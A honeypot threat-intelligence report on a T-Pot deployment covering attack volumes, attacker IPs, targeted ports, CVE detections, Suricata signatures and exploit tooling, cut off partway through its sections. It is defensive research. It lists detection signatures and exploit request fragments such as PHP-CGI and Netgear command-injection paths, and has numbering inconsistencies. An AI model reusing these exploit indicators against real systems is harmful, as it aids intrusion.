# T-Pot Honeypot Threat Intelligence Report

**Date:** May 31, 2026  
**Version:** 2.0  
By: Prince Lassey

---

## Table of Contents

1.  [Executive Summary](#1-executive-summary)
2.  [Observation Period & Infrastructure](#2-observation-period--infrastructure)
    -   2.1 [Platform & Deployment](#21-platform--deployment)
    -   2.2 [Honeypot Services Deployed](#22-honeypot-services-deployed)
    -   2.3 [Methodology](#23-methodology)
3.  [Attack Volume & Source Analysis](#3-attack-volume--source-analysis)
    -   3.1 [Total Event Counts](#31-total-event-counts)
    -   3.2 [Attack Volume by Service](#32-attack-volume-by-service)
    -   3.3 [Top 15 Attacking IPs](#33-top-15-attacking-ips)
    -   3.4 [Attacker Infrastructure](#34-attacker-infrastructure)
    -   3.5 [Attacker IP Reputation](#35-attacker-ip-reputation)
    -   3.6 [Operating System Fingerprinting (p0f)](#36-operating-system-fingerprinting-p0f)
4.  [Geographic Distribution](#4-geographic-distribution)
5.  [Attack Surface - Target Ports & Protocols](#5-attack-surface-target-ports--protocols)
6.  [Vulnerability Exploitation - CVE Detections](#6-vulnerability-exploitation-cve-detections)
7.  [Attacker Tooling & Detection Signatures](#7-attacker-tooling--detection-signatures)
    -   7.1 [Scanning Tools Detected](#71-scanning-tools-detected)
    -   7.2 [Top Suricata Signatures Fired](#72-top-suricata-signatures-fired)
    -   7.3 [Exploitation Frameworks](#73-exploitation-frameworks)
8.  [SSH Intrusion Analysis (Cowrie)](#8-ssh-intrusion-analysis-cowrie)
9.  [Malware & Payload Analysis](#9-malware--payload-analysis)
10.  [Post-Exploitation Command Analysis](#10-post-exploitation-command-analysis)
     -   10.1 [Most Executed Commands](#101-most-executed-commands)
     -   10.2 [SSH Key Backdoor - "mdrfckr"](#102-ssh-key-backdoor-mdrfckr)
     -   10.3 [Cleanup Command](#103-cleanup-command)
     -   10.4 [Cowrie Post-Exploitation Commands - By Attacker IP](#104-cowrie-post-exploitation-commands-by-attacker-ip)
     -   10.5 [ADB Honeypot Attack Commands - By Attacker IP](#105-adb-honeypot-attack-commands-by-attacker-ip)
     -   10.6 [Web Honeypot HTTP Attack Analysis](#106-web-honeypot-http-attack-analysis-tanner-wordpot-nginx-ipphoney-dionaea)
11.  [Coordinated Attack Campaigns](#11-coordinated-attack-campaigns)
12.  [Human Behaviour Analysis](#12-human-behaviour-analysis)
13.  [DoublePulsar / SMB Exploitation Campaign](#13-doublepulsar--smb-exploitation-campaign)
14.  [Redis Honeypot Activity](#14-redis-honeypot-activity)
15.  [Reconstructed Attack Timelines](#16-reconstructed-attack-timelines)
16.  [Threat Indicators of Compromise (IOCs)](#17-threat-indicators-of-compromise-iocs)
17.  [VirusTotal IP Enrichment](#17-virusTotal-ip-enrichment)
18.  [Recommendations](#18-recommendations)
19.  [Appendix](#19-appendix)

---

## 1\. Executive Summary

Over a 21-day active observation window, a T-Pot CE honeypot deployed on AWS EC2 recorded approximately **3.47 million total events** across 20 active sourcetypes, sourced from **20,727 unique external IP addresses**.

> **Log Retention Note:** The T-Pot ELK stack was initially deployed with default log retention. After the first operational period, retention was adjusted to approximately **3 months** to manage storage. As a result, some early-deployment logs were lost before this adjustment took effect. The attacker tool detections in 7.1/7.3 (Masscan, Zmap, libredtail-http, Mozi, Mirai, GPON/DVR exploits, TOR SSH clients) were recorded from those earlier logs before rotation. They are included as confirmed observed intelligence, but specific source IPs and Suricata SIDs for those early detections are no longer queryable in Splunk or ELK. All event counts elsewhere in this report reflect only the data that survives in the current index. The honeypot stack  captured a broad cross-section of contemporary internet-facing threats. VirusTotal enrichment was performed on the top 100 attacking IPs and all 51 malware hashes.

**Key findings:**

-   **SMB/EternalBlue dominance:** Port 445 received 95,656 Suricata-detected events — the single highest-volume attack surface. DoublePulsar (MS17-010) scanning was systematic, industrialised, and geographically distributed across 15+ confirmed source IPs. Dionaea captured **22 WannaCry ransomware samples** delivered via EternalBlue, all confirmed malicious at 88–95% VT detection rates — confirming unpatched Windows SMB services remain actively exploited in 2026.
-   **Active SSH compromise with confirmed payloads:** 18 successful Cowrie login events were recorded from 14 distinct IPs. At least **6 IPs achieved post-authentication command execution**, and **14 malware download events** were logged. Full VirusTotal analysis of **21 Cowrie SHA256 hashes** identified 15 malicious payloads spanning Linux XMRig miners, Mirai botnet agents, a Gafgyt/Mozi ARM IoT backdoor (75.8% detection rate, community score -290), and a trojanized sshd replacement. **Three hashes are absent from VirusTotal** — representing novel, uncatalogued samples captured as original threat intelligence.
-   **Cobalt Strike C2 infrastructure identified:** Three AWS IPs: 18.218.118.203, 3.132.26.232, and 3.129.187.38  carry JARM hashes matching known Cobalt Strike C2 profiles. 3.132.26.232 additionally probed non-standard ports consistent with CS listeners (4433, 22999, 22226) and used AWS API Gateway SSL fronting — a documented domain-fronting technique for C2 traffic blending. These represent the most sophisticated actor fingerprints in the dataset.
-   **ICS/SCADA targeting confirmed:** IP 18.218.118.203 (Cobalt Strike JARM, AWS) systematically probed three distinct industrial control system protocols via ConPot. **Kamstrup smart meter protocol** (port 1025, 48 events), **IEC 104 industrial control** (port 2404, 15 events), and **Guardian AST automatic tank gauges** (port 10001, 8 events: used at petrol stations). Multi-protocol ICS targeting combined with a Cobalt Strike JARM fingerprint is a critical infrastructure threat indicator.
-   **Coordinated threat actor clusters:** Three distinct operator clusters were identified beyond individual IPs: (1) The **IONOS SE fleet:** 9 VPS nodes on 31.70.64.0/18 generating 5,015 combined attacks from a single provisioned actor; (2) The **Alsycon bulletproof cluster:** 4 nodes across two subnets (160.119.76.0/23, 185.224.128.0/24) generating 1,130 attacks; (3) The **2026-05-24 SSH campaign** involving 12 IPs sharing credentials and payloads across a 4-hour window.
-   **Bulletproof hosting infrastructure prominent:** Of 100 IPs analysed, 8 resolved to known bulletproof or privacy hosting providers (Omegatech, Pfcloud, Tube-Hosting, Alsycon ×4, FranTech/BuyVM, Offshore LC, Sino Worldwide). IP 46.151.178.13 (Sino Worldwide, Chinese-affiliated Netherlands ASN) carries a VT community score of **\-50,** the highest malicious community consensus in the dataset. IPs 158.94.210.44 and 176.65.139.11 each have **20 linked malware files** on VirusTotal.
-   **Compromised critical devices:** Two high-value device compromises were identified among attacking IPs. **152.52.15.214** (Bharti Airtel, India) presents a FortiGate firewall SSL certificate, almost certainly a FortiOS RCE victim (CVE-2022-40684, CVE-2024-21762) being used as an attack relay. **90.169.216.25** (Orange Spain) presents a Synology NAS hostname (`artecomp.synology.me`) with 10 historical SSL certs, a long-compromised NAS device.
-   **ADB exploitation campaign confirmed:** ADBHoney captured **8 Android/ARM payloads**, all malicious, including a complete `com.ufo.miner.apk` Android cryptominer and a fresh ARM ELF binary first seen on VirusTotal just **4 days before capture.** Six of eight samples share a common execution parent cluster, confirming a single coordinated ADB exploitation campaign.
-   **SSH coordinated actor pair:** IPs `81.9.145.130` (Turkey, Euskaltel ISP, 13/91 VT) and `197.140.11.157` (Algeria, Icosnet, 11/91 VT - likely compromised business server) used identical credentials (`online@2025`, `git/git@123`), executed the same post-exploitation playbook, and downloaded the same payload binaries within a 79-minute window - confirming shared tooling or a single operator.
-   **Human-operated intrusion confirmed:** IP `40.112.183.29` (Azure, community score -9) exhibited unmistakably human behaviour - manual `w`/`top` commands across three sessions with 6–11 minute inter-session gaps. No automated tool produces this pattern.
-   **Novel CVEs observed:** Signatures for `CVE-2025-34036`, `CVE-2025-55182`, and `CVE-2026-24061` were triggered - indicating active weaponisation of vulnerabilities disclosed within the past 12 months, including one from the current year.
-   **43.8% of Suricata IPs pre-listed as malicious:** Of 20,727 unique external IPs, 9,067 were already listed on Dshield, Spamhaus, or CINS feeds - confirming nearly half of attack traffic originates from infrastructure with known malicious history.

---

## 2\. Observation Period & Infrastructure

### 2.1 Platform & Deployment

| Parameter | Value |
| --- | --- |
| Platform | T-Pot CE v24.x (multi-honeypot framework by Deutsche Telekom) |
| Deployment | AWS EC2 |
| Operating System | Debian Linux |
| Active observation window | 21 days |
| Log aggregation | Elasticsearch + Kibana (ELK Stack, built into T-Pot) |
| SIEM | Splunk - index=`honeypot` (log forwarding via Universal Forwarder) |
| Network exposure | Full public internet - no inbound filtering |

### 2.2 Honeypot Services Deployed

During the monitoring period, the T-Pot deployment recorded approximately **3.47 million security events** across multiple honeypots and detection sensors, providing visibility into a broad range of attacker behaviors. The highest volume of activity was captured by **p0f** (1.58 million events), which passively fingerprinted operating systems from incoming traffic, followed by **Honeytrap** (827,895 events) and **Suricata IDS** (790,541 events), which revealed extensive port scanning, service enumeration, vulnerability probing, and signature-based detections. Significant activity was also observed through **FATT** (103,337 events), highlighting attacker tool and TLS fingerprinting, while **Nginx**, **Heralding**, and **Dionaea** collectively recorded over 100,000 events related to web exploitation attempts, credential harvesting, malware delivery, and service abuse. Specialized honeypots such as **ConPot** identified sustained targeting of industrial control systems (24,636 events), **SentryPeer** captured VoIP scanning and toll fraud attempts (13,911 events), and **Cowrie** recorded SSH/Telnet brute-force attacks, post-exploitation activity, and malware deployment attempts (8,642 events). Additional probes targeted SMTP, Android Debug Bridge (ADB), Redis, printers, WordPress installations, network appliances, and API endpoints, demonstrating widespread opportunistic scanning and automated exploitation campaigns across diverse technologies and services.

### 2.3 Methodology

All honeypot logs were ingested into Elasticsearch and visualised in Kibana (T-Pot's built-in ELK stack). Logs were simultaneously forwarded to Splunk for correlation, alert development, and deeper TTP analysis. Network-level traffic was analysed using Suricata IDS running in parallel within T-Pot, providing CVE-level signature matches and alert categories.

File samples captured by Dionaea, Cowrie and AdbHoney were reviewed and cross-referenced with VirusTotal. SHA256 hashes were extracted directly from Cowrie session logs. OSINT enrichment was performed on top attacker IPs using Virustotal, and Splunk's built-in `iplocation` command. Attacker OS fingerprinting was performed passively by p0f - no active probing of attacker infrastructure was conducted.

All event counts in this report are derived directly from Splunk queries against `index=honeypot`. No data was estimated, interpolated, or carried over from prior report versions which I was initially writing for some weeks back.

---

## 3\. Attack Volume & Source Analysis

### 3.1 Total Event Counts

| Scope | Unique IPs | Total Events |
| --- | --- | --- |
| All honeypot sources (non-Suricata) | 1,395 | 987,725 |
| Suricata IDS (external IPs only) | 20,727 | 543,854 |
| **Combined (all sourcetypes, all IPs)** | **~20,900** | **~3,470,714** |

### 3.2 Attack Volume by Service

![](https://user-cdn.phcode.site/images/1aae7834-5471-4c49-a6ac-6b1aec0bbb74.png)  
**Note on p0f volume:** p0f fires a log entry for every observed TCP connection (MTU probe, SYN fingerprint, SYN+ACK). Its high count reflects total inbound connection attempts across all ports - not discrete attackers. 

### 3.3 Top 20 Attacking IPs - All Sources, VT Enriched

Corrected ranking based on verified attack counts across all honeypot sourcetypes. VT enrichment from VirusTotal IP analysis (100 IPs analysed).

| Rank | IP Address | Count | Country / ASN | VT Risk | Infrastructure Type | Notes |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | 201.216.239.205 | 5,893 | 🇦🇷 NSS S.A. (AS16814) | 1/91 | Compromised ISP | EternalBlue/Metasploit SMBv1 scanner (see §13); highest single-IP volume |
| 2 | 138.197.101.205 | 3,849 | 🇺🇸 DigitalOcean (AS14061) | 6/91 | VPS attack node | SSL for thehemphouses.com; 4 DNS resolutions; automated scanner |
| 3 | 92.39.134.154 | 3,155 | 🇷🇺 OOO WestCall (AS9049) | 0/91 | Compromised ISP | NAGTECH self-signed SSL; JARM fingerprint present; Russian regional ISP |
| 4 | 103.182.225.202 | 3,149 | 🇮🇩 PT iForte (AS63859) | 1/91 | Compromised ISP | Community -1; Indonesian ISP endpoint |
| 5 | 158.94.210.44 | 2,891 | 🇳🇱 Omegatech LTD (AS202412) | 20/91 | Bulletproof hosting | 20 linked malware files; no cert/domain - dedicated attack node (see16.6) |
| 6 | 201.187.98.150 | 2,795 | 🇨🇱 Telefonica Chile (AS7303) | 3/91 | Compromised ISP | 3 DNS resolutions; Telefonica consumer IP |
| 7 | 190.60.60.194 | 2,555 | 🇨🇴 UFINET Colombia (AS27831) | 0/91 | Compromised ISP | Clean on VT; compromised Colombian endpoint |
| 8 | 99.208.104.202 | 1,930 | 🇨🇦 Rogers Communications (AS812) | 8/91 | Compromised residential | Dynamic residential hostname; one linked malware file; compromised home gateway |
| 9 | 31.70.75.115 | 1,824 | 🇩🇪 IONOS SE (AS8560) | 3/91 + 2 susp. | IONOS VPS fleet | Part of 9-node IONOS actor cluster - 5,015 combined attacks (see 11.3) |
| 10 | 190.186.29.213 | 1,564 | 🇧🇴 COTAS LTDA (AS25620) | 9/91 + 3 susp. | Compromised ISP | JARM present; Bolivian ISP endpoint |
| 11 | 8.210.133.68 | 1,413 | 🇭🇰 Alibaba Cloud (AS45102) | 2/91 | Cloud attack node | Primary Redis attacker  491 Redis events (see 14) |
| 12 | 142.93.183.218 | 1,293 | 🇺🇸 DigitalOcean (AS14061) | 3/91 | VPS attack node | 18 domain resolutions; 5 certs - heavily recycled multi-tenant VPS |
| 13 | 31.70.89.209 | 1,272 | 🇩🇪 IONOS SE (AS8560) | 3/91 + 1 susp. | IONOS VPS fleet | Second IONOS fleet node - same coordinated actor |
| 14 | 16.58.56.214 | 1,248 | 🇺🇸 Amazon AWS (AS16509) | 5/91 | Malicious AWS instance | 5 community malicious votes; no cert/resolution - clean attack-only node |
| 15 | 167.99.250.53 | 1,148 | 🇩🇪 DigitalOcean (AS14061) | 7/91 | VPS attack node | 16 DNS resolutions; 10 historical certs - high IP reuse, repurposed attack node |
| 16 | 128.199.5.21 | 1,122 | 🇸🇬 DigitalOcean (AS14061) | 1/91 | VPS (mixed hosting) | 20 domain resolutions; 8 historical certs - heavily multi-tenanted |
| 17 | 18.218.118.203 | 1,010 | 🇺🇸 Amazon AWS (AS16509) | 8/91 | Malicious AWS - CS JARM | **Cobalt Strike JARM match** (29d29d00029d29d21c); ICS/ConPot targeting (see16.7) |
| 18 | 18.116.101.220 | 1,004 | 🇺🇸 Amazon AWS (AS16509) | 5/91 | AWS attack node | JARM fingerprint present; 5 DNS resolutions |
| 19 | 3.129.187.38 | 951 | 🇺🇸 Amazon AWS (AS16509) | 5/91 + 4 susp. | AWS - CS JARM | Second Cobalt Strike JARM match; 10 DNS resolutions; 5 historical certs |
| 20 | 39.152.28.80 | 918 | 🇨🇳 China Mobile (AS56044) | 8/91 | Compromised endpoint | No cert/resolution - likely compromised IoT device or router |

### 3.4 Attacker Infrastructure

Splunk's built-in `iplocation` command does not populate ASN fields for this dataset. The following breakdown was derived by matching known cloud provider CIDR ranges against Suricata external source IPs (543,854 events, excluding RFC1918 and link-local).

| Cloud Provider | Est. Event Count | % of Suricata Events | Significance |
| --- | --- | --- | --- |
| Google Cloud (GCP) | 38,791 | 7.1% | GCP-hosted scanners - 34.x.x.x, 35.x.x.x ranges |
| Microsoft Azure | 14,876 | 2.7% | Azure-hosted scanners - 40.x, 20.x, 52.x, 13.x ranges |
| DigitalOcean | 11,191 | 2.1% | VPS abuse, botnet C2 - 138.197.x, 167.71.x, 142.93.x |
| Amazon AWS | 10,818 | 2.0% | AWS-hosted attack infra - 3.x ranges |
| **Other / ISP / Unknown** | **468,178** | **86.1%** | Residential, ISP, non-cloud VPS, compromised hosts |

> **Interpretation:** ~14% of all Suricata-detected attack traffic originates from major cloud providers (GCP, Azure, AWS, DigitalOcean), consistent with widespread abuse of cloud VPS infrastructure for scanning and exploitation. GCP leading this group is notable given it doesn't rate-limit outbound connections by default. The 86% "other" category represents the broad internet: ISPs, hosting providers, and compromised residential/enterprise hosts.

> **Caution:** These figures use CIDR-prefix matching, not authoritative BGP ASN lookups. They are indicative rather than precise. 

### 3.5 Attacker IP Reputation

Suricata fired blocklist-based DROP and CINS signatures against **9,067 unique external IPs** generating **96,359 events** — representing IPs already listed on major threat intelligence feeds at the time of observation.

| Threat Intel Feed | Suricata Signature | Event Count |
| --- | --- | --- |
| Dshield Block List | ET DROP Dshield Block Listed Source group 1 | 20,447 |
| Spamhaus DROP | ET DROP Spamhaus DROP Listed Traffic group 4 | 2,127 |
| Spamhaus DROP | ET DROP Spamhaus DROP Listed Traffic group 7 | 1,862 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 220 | 1,273 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 221 | 1,253 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 222 | 1,236 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 216 | 1,195 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 290 | 1,180 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 219 | 1,143 |
| CINS Active Threat Intel | ET CINS Poor Reputation IP group 218 | 1,134 |

**Summary:** Of the 20,727 unique external IPs detected by Suricata, **9,067 (43.8%)** were pre-listed on at least one major threat intelligence blocklist, confirming that nearly half of all inbound attack traffic originates from infrastructure with known malicious history.

### 3.6 Operating System Fingerprinting (p0f)

![](https://user-cdn.phcode.site/images/304209dc-299b-4333-b4c5-9cfd5dfe56f5.png)

p0f passively fingerprinted the OS of inbound connection sources via TCP SYN analysis (`mod=syn`, `subject=cli`, external IPs only). Total fingerprinted connections: **281,821**.

**Key observation:** Over **75% of fingerprinted attackers present a Linux TCP stack** - consistent with VPS-hosted scanning infrastructure, containerised bots, and compromised Linux servers. The ~20% Windows share (NT 5.x, Win 7/8, NT generic) represents a mix of legacy unpatched Windows hosts and possibly spoofed/tunnelled stacks. The presence of Windows XP (25 connections) is notable — these hosts are over 12 years past end-of-life and almost certainly compromised or part of a botnet.

---

## 4\. Geographic Distribution

### 4.1 Top 15 Source Countries

![](https://user-cdn.phcode.site/images/1df875c1-de6e-453f-8cee-218951923a0f.png)

---

## 5\. Attack Surface - Target Ports & Protocols

### 5.1 Top 15 Targeted Ports (Suricata)

| Rank | Port | Protocol/Service | Event Count | Significance |
| --- | --- | --- | --- | --- |
| 1 | 445 | SMB | 95,656 | EternalBlue/DoublePulsar mass scanning |
| 2 | 5900 | VNC | 27,815 | Remote desktop credential attacks |
| 3 | 23 | Telnet | 20,085 | IoT/legacy device brute-forcing |
| 4 | 2222 | SSH (alt) | 9,420 | Cowrie SSH honeypot — credential capture |
| 5 | 64297 | Unknown/proprietary | 8,899 | Likely router/embedded device target |
| 6 | 80 | HTTP | 8,349 | Web app scanning, CVE exploitation |
| 7 | 22 | SSH | 7,689 | Standard SSH brute-force |
| 8 | 443 | HTTPS | 7,561 | TLS service scanning/exploitation |
| 9 | 5060 | SIP/VoIP | 6,136 | VoIP infrastructure attacks |
| 10 | 8080 | HTTP alt | 5,273 | Web proxy/admin panel attacks |
| 11 | 1433 | MSSQL | 4,018 | Database credential attacks |
| 12 | 25 | SMTP | 2,878 | Mail server attacks/relaying |
| 13 | 8443 | HTTPS alt | 2,327 | Admin panel / API gateway attacks |
| 14 | 3389 | RDP | 2,259 | Remote desktop credential attacks |
| 15 | 8888 | HTTP alt / Jupyter | 1,762 | Jupyter Notebook / web service scanning |

### 5.2 Additional Non-Suricata Port Observations

| Port | Count | Context |
| --- | --- | --- |
| 9100 | 561 | Printer (JetDirect) — printer exploitation/data exfil |
| 80 | 210 | HTTP application-layer hits |
| 5555 | 57 | Android Debug Bridge (ADB) — Android device hijacking |
| 443 | 53 | HTTPS probes |

---

## 6\. Vulnerability Exploitation - CVE Detections

All CVEs below were detected via Suricata signature matches against external, non-RFC1918 source IPs.

| CVE | Count | Service/Product | Severity | Notes |
| --- | --- | --- | --- | --- |
| CVE-2019-11500 | 74 | Dovecot IMAP/POP3 | Critical | Pre-auth buffer overflow; most active CVE in dataset |
| CVE-2021-3449 | 51 | OpenSSL TLS | High | NULL pointer deref / DoS via malformed renegotiation |
| CVE-2024-4577 | 46 | PHP-CGI (Windows) | Critical | Argument injection / RCE — actively exploited in 2024–2025 |
| CVE-2021-41773 | 23 | Apache HTTP Server 2.4.49 | Critical | Path traversal leading to RCE |
| CVE-2021-42013 | 23 | Apache HTTP Server 2.4.49/50 | Critical | Bypass of 41773 patch - often paired with it |
| CVE-2016-20016 | 3 | MVPower DVR | Critical | Remote code execution on legacy DVR units (IoT) |
| CVE-2018-2893 | 2 | Oracle WebLogic | Critical | Deserialization RCE |
| CVE-2025-34036 | 2 | Custom HTTP service called "Cross Web Server" | Critical | OS command injection vulnerability |
| CVE-2016-20017 | 1 | D-Link DSL-2750B | Critical | Remote command injection on routers |
| CVE-2024-40891 | 1 | Zyxel CPE (DSL routers) | Critical | Command injection — actively exploited 2024–2025 |
| CVE-2025-55182 | 1 | React2Shell | Critical | Unauthenticated Remote Code Execution (RCE) vulnerability in React Server Components |
| CVE-2026-24061 | 1 | GNU InetUtils telnetd service | Critical | Remote Code Exeecution |

---

## 7\. Attacker Tooling & Detection Signatures

### 7.1 Scanning Tools Detected

Tools marked *(pre-rotation)* were detected in early deployment logs before the log retention adjustment. Source IPs for these are no longer queryable but detections are confirmed observed.

| Tool | Detection Method | Event Count | Source IPs (sample) | Characteristics |
| --- | --- | --- | --- | --- |
| **Nmap (-sS)** | Suricata SID 2009582 - "ET SCAN NMAP -sS window 1024" | 9,402 | 167.250.224.25 (BR) + multiple | TCP SYN scan, window size=1024 — most common Nmap default |
| **Nmap (-sA)** | Suricata - "ET SCAN NMAP -sA (1)" | 37 | Various | ACK scan — firewall rule enumeration |
| **Nmap (SIP)** | Suricata - "ET SCAN NMAP SIP Version Detect OPTIONS Scan" | 6 | Various | SIP service version detection |
| **Nmap (TCP)** | Suricata - "GPL SCAN nmap TCP" | 1 | Various | Generic TCP scan fingerprint |
| **Masscan** *(pre-rotation)* | SMTP HELO banner: `HELO masscan` captured by Mailoney | \- | 45.79.141.116 (US/Akamai) | High-rate SYN scanner; randomized source ports; SMTP banner grab |
| **Zmap / Zgrab** *(pre-rotation)* | HTTP User-Agent `zgrab/0.x` in Tanner/Dionaea logs | \- | 16.58.56.214 (US/AWS) | Banner grabbing tool; often paired with Zmap for full-internet scans |
| **libredtail-http** *(pre-rotation)* | Custom User-Agent string in Tanner/Dionaea logs | \- | 118.145.66.151 (CN), 185.91.69.217 (UK) | Custom Python scanner; historically associated with Chinese threat actors |
| **xfa1** *(pre-rotation)* | Custom HTTP User-Agent string | \- | 167.250.224.25 (BR) | Unknown scanner; correlated with CVE-2024-4577 exploitation attempts |
| **Masscan (inferred)** | Honeytrap high-frequency SYN connections | 827,895 honeytrap events | Various | The 827,895 honeytrap events are consistent with bulk SYN probing. No dedicated sig fired — Masscan configured to avoid fingerprints |
| **MS Terminal Server Scanner** | Suricata SID 2023753 | 2,412 | Various | RDP/MSTS traffic on non-standard ports — Metasploit or custom RDP scanner |
| **SNMP Scanner** *(pre-rotation)* | `public` community string probes | \- | 147.203.255.20 (US) | Standard SNMP enumeration with default community string |
| **Shodan / Censys** | Known crawler ASNs and User-Agents | Baseline | Various | Internet scanning services — mostly benign baseline noise |

### 7.2 Top Suricata Signatures Fired

All counts are for the full Suricata dataset. Source: provided Suricata signature ID export.

| Rank | SID | Signature | Count | Category |
| --- | --- | --- | --- | --- |
| 1 | 2024766 | ET EXPLOIT \[PTsecurity\] DoublePulsar Backdoor installation communication | 25,338 | Exploit |
| 2 | 2402000 | ET DROP Dshield Block Listed Source group 1 | 20,212 | Threat Intel |
| 3 | 2100560 | GPL INFO VNC server response | 14,042 | Recon |
| 4 | 2002752 | ET INFO Reserved Internal IP Traffic | 10,284 | Internal |
| 5 | 2009582 | ET SCAN NMAP -sS window 1024 | 9,237 | Scanner |
| 6 | 2016149 | ET INFO Session Traversal Utilities for NAT (STUN Binding Request) | 3,155 | Protocol |
| 7 | 2016150 | ET INFO Session Traversal Utilities for NAT (STUN Binding Response) | 3,154 | Protocol |
| 8 | 2001980 | ET INFO SSH Client Banner Detected on Unusual Port | 2,645 | Recon |
| 9 | 2023753 | ET SCAN MS Terminal Server Traffic on Non-standard Port | 2,409 | Scanner |
| 10 | 2400003 | ET DROP Spamhaus DROP Listed Traffic Inbound group 4 | 2,101 | Threat Intel |
| 11 | 2210037 | SURICATA STREAM FIN recv but no session | 2,019 | Anomaly |
| 12 | 2024897 | ET USER\_AGENTS Go HTTP Client User-Agent | 1,951 | Recon |
| 13 | 2060251 | ET INFO Go-http-client User-Agent Observed Outbound | 1,951 | Recon |
| 14 | 2010935 | ET SCAN Suspicious inbound to MSSQL port 1433 | 1,874 | Scanner |
| 15 | 2400006 | ET DROP Spamhaus DROP Listed Traffic Inbound group 7 | 1,815 | Threat Intel |
| 16 | 2210041 | SURICATA STREAM RST recv but no session | 1,510 | Anomaly |
| 17 | 2403519 | ET CINS Active Threat Intelligence Poor Reputation IP group 220 | 1,250 | Threat Intel |
| 18 | 2403520 | ET CINS Active Threat Intelligence Poor Reputation IP group 221 | 1,229 | Threat Intel |
| 19 | 2210051 | SURICATA STREAM Packet with broken ack | 1,227 | Anomaly |
| 20 | 2001984 | ET INFO SSH session in progress on Unusual Port | 1,221 | Recon |

**Additional notable signatures from full dataset:**

| SID | Signature | Count | Significance |
| --- | --- | --- | --- |
| 2029054 | ET SCAN Zmap User-Agent (Inbound) | 464 | Zmap scanner confirmed in current logs |
| 2002924 | ET EXPLOIT VNC Server Not Requiring Authentication (case 2) | 252 | VNC auth bypass actively exploited |
| 2002920 | ET INFO VNC Authentication Failure | 248 | Brute-force against VNC |
| 2033451 | ET EXPLOIT Possible Dovecot Memory Corruption Inbound (CVE-2019-11500) | 69 | Most-triggered CVE in dataset |
| 2023997 | ET INFO Potentially unsafe SMBv1 protocol in use | 69 | SMBv1 legacy protocol in active use |
| 2060800 | ET WEB\_SPECIFIC\_APPS PHP-CGI OS Command Injection (soft hyphen) (CVE-2024-4577) | 46 | PHP-CGI RCE — active exploitation campaign |
| 2034125 | ET EXPLOIT Apache HTTP Server 2.4.49 Path Traversal (CVE-2021-41773) M2 | 23 | Apache path traversal |
| 2034173 | ET EXPLOIT Apache HTTP Server Path Traversal (CVE-2021-42013) M2 | 23 | Apache patch bypass — paired with above |
| 2046158 | ET SCADA IEC-104 TESTFR (Test Frame) Activation | 12 | **ICS/SCADA targeting** |
| 2046159 | ET SCADA IEC-104 TESTFR (Test Frame) Confirmation | 12 | ICS protocol interaction confirmed |
| 2046164 | ET SCADA IEC-104 Station Interrogation - Global ASDU Broadcast | 10 | ICS full station interrogation attempt |
| 2046160 | ET SCADA IEC-104 STARTDT Activation | 8 | ICS data transfer initiation |
| 2046161 | ET SCADA IEC-104 STARTDT Confirmation | 8 | ICS data transfer confirmed |
| 2025519 | ET INFO Cisco Smart Install Protocol Observed | 9 | Cisco device targeting |
| 2008953 | ET ATTACK\_RESPONSE Possible MS CMD Shell opened on local system | 276 | Command shell opened — post-exploitation indicator |
| 2059807 | ET MALWARE J-magic (nfsiod) Backdoor Magic Packet Inbound Request M5 | 4 | J-magic backdoor targeting (Cisco router malware) |
| 2026731 | ET WEB\_SERVER ThinkPHP RCE Exploitation Attempt | 42 | ThinkPHP framework RCE — common in Chinese threat actor campaigns |
| 2009207 | ET MALWARE Possible KEYPLUG/Downadup/Conficker-C P2P encrypted traffic | 11 | Conficker/KEYPLUG P2P beacon |
| 2500024 | ET COMPROMISED Known Compromised or Hostile Host Traffic group 13 | 61 | Compromised host blocklist hit |
| 2031501 | ET INFO Netlink GPON Login Attempt (GET) | 10 | GPON router exploitation (Mozi botnet) |

> **ICS/SCADA observation:** SIDs 2046158–2046164 confirm IEC 60870-5-104 (IEC-104) protocol interaction against the ConPot industrial honeypot. This is the same protocol family used in power grid SCADA systems. The sequence TESTFR → STARTDT → Station Interrogation represents a complete IEC-104 session initiation — an attacker (or scanner) that understands industrial control system protocols. Combined with the Cobalt Strike JARM on 18.218.118.203 targeting ConPot, this is the most significant critical infrastructure finding in the dataset.

### 7.3 Exploitation Frameworks

Tools marked *(pre-rotation)* were detected in early deployment logs. Source IPs are no longer queryable but detections are confirmed observed.

| Framework / Malware | Evidence | CVEs / Techniques | Source IPs (sample) |
| --- | --- | --- | --- |
| **EternalBlue / DoublePulsar** | Suricata SID 2024766 — 25,338 hits; SMBv2 shellcode pattern `^Rs6^Rs6` *(pre-rotation)* | MS17-010 | 94.49.7.253 (SA) + 15 DoublePulsar IPs |
| **Metasploit (MS17-010)** | Suricata — "ET EXPLOIT ETERNALBLUE Probe MSF style" | MS17-010 | 201.216.239.205 (AR) |
| **Metasploit (RDP/MSTS)** | Suricata SID 2023753 | RDP scanning | Various |
| **Mozi Botnet** *(pre-rotation)* | User-Agent `Hello, World`; Mozi.m payload download | GPON Router exploitation | 120.28.212.118 (PH), 36.255.33.244 (PK) |
| **Mirai / ZKWEA** *(pre-rotation)* | Busybox execution; `ZKWEA` string in Cowrie logs; `/bin/busybox [TOKEN]` commands observed | T1498 (DDoS), T1105 | Multiple Cowrie sessions |
| **PHP CGI exploit tooling** | CVE-2024-4577 Suricata hits — 46 events; `php://input`, `allow_url_include` patterns | CVE-2024-4577 | 118.145.66.151 (CN) *(pre-rotation)* |
| **PHPUnit RCE Scanner** *(pre-rotation)* | `eval-stdin.php` requests | CVE-2017-9841 | 118.145.66.151 (CN) |
| **Apache path traversal toolchain** | CVE-2021-41773 + CVE-2021-42013 — 23 hits each, paired | Dual-exploit fallback pattern | Various |
| **GPON Router Exploit** *(pre-rotation)* | `Hello, World` UA; `/soap.cgi` requests | IoT RCE | 120.28.212.118 (PH) |
| **MVPower DVR Exploit** *(pre-rotation)* | `/shell` endpoint; CVE-2016-20016 | CVE-2016-20016 | 204.76.203.50 (NL) |
| **Netgear DGN Exploit** *(pre-rotation)* | `setup.cgi?todo=syscmd` requests | IoT command injection | 36.255.33.244 (PK) |
| **Dovecot exploit** *(pre-rotation)* | CVE-2019-11500 on port 993 | CVE-2019-11500 | 44.220.185.41 (US/AWS) |
